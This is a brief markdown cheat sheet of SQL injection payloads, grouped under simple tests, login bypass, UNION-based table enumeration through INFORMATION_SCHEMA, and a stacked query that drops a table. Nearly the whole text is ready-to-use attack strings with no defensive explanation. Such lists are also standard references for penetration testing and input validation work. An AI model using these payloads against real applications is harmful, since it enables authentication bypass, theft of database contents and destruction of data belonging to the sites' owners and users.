# SQL Injection Basics

## Simple Tests

```
' --
' or 'a'='a
' or 'a'='a'--
' or '1'='1
' or 1=1--
```

## Bypass Login

```
any' or 1=1 limit 1;#
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
....
```

## Union Injections

```
' UNION SELECT field1, field2 FROM table--
' UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database()--
```

## Stacked queries

```
'; DROP TABLE table;--
```
